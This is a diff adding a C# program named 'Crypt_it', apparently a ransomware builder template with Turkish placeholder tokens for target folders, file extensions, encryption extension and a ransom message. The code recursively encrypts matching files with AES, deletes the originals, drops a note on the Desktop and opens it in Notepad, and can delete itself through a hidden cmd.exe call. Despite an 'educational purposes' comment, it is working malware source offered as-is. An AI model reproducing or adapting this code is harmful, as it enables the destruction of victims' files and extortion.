@@ -1,0 +1,111 @@
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Diagnostics;
+using System.Threading;
+using System.Globalization;
+using System.Net;
+using System.Security.Cryptography;           //WARNING! ONLY FOR EDUCATIONAL PURPOSES!
+using System.IO;                              //MADE BY 20071999
+namespace Crypt_it
+{
+    class Program
+    {
+         public static string imha = "DEGER";
+        static void Main(string[] args)
+        {
+            Crypt(new string[] {HANGIDIZINLER}, new string[] {@HANGIUZANTILER }, @"PASSWORD", @".UZANTICRYPT");
+            using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\NOTISMI.txt"))
+            {
+                sw.WriteLine(@"MESAJ");
+            }
+
+             System.Diagnostics.Process.Start("notepad.exe",Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\NOTISMI.txt");
+
+              if(imha == "EVET")
+            {
+           imha_zamani();
+           }
+        }
+ public static void imha_zamani()
+        {
+
+            Process.Start(new System.Diagnostics.ProcessStartInfo()
+            {
+                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + System.Reflection.Assembly.GetExecutingAssembly().Location,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                FileName = "cmd.exe"
+            });
+            Environment.Exit(0);
+        }
+        private static void Crypt(string[] dizin, string[] uzantilar, string sifre, string crypt_uzantisi)
+        {
+            for(int x = 0;x< dizin.Length;x++)
+            {
+                for (int c = 0; c < uzantilar.Length; c++)
+                {
+                    if(Directory.Exists(dizin[x]))
+                    {
+                    DirectoryInfo f = new DirectoryInfo(dizin[x]);
+                    FileInfo[] d = f.GetFiles("*." + uzantilar[c], SearchOption.AllDirectories);
+                    foreach (FileInfo v in d)
+                    {
+
+                        Encrypt(v.FullName, v.FullName + crypt_uzantisi, new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
+
+                    }
+
+                   }
+                }
+            }
+
+
+        }
+        private static void Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
+        {
+
+            try
+            {
+                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+                string cryptFile = outputFile;
+                FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);
+
+                RijndaelManaged AES = new RijndaelManaged();
+
+                AES.KeySize = 256;
+                AES.BlockSize = 128;
+
+
+                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                AES.Key = key.GetBytes(AES.KeySize / 8);
+                AES.IV = key.GetBytes(AES.BlockSize / 8);
+                AES.Padding = PaddingMode.Zeros;
+
+                AES.Mode = CipherMode.CBC;
+
+                CryptoStream cs = new CryptoStream(fsCrypt,
+                     AES.CreateEncryptor(),
+                    CryptoStreamMode.Write);
+
+                FileStream fsIn = new FileStream(inputFile, FileMode.Open);
+
+                int data;
+                while ((data = fsIn.ReadByte()) != -1)
+                    cs.WriteByte((byte)data);
+
+
+                fsIn.Close();
+                cs.Close();
+                fsCrypt.Close();
+                File.Delete(inputFile);
+            }
+            catch (Exception ex) { Console.WriteLine(ex.Message); }
+        }
+
+
+
+
+    }
+
+}
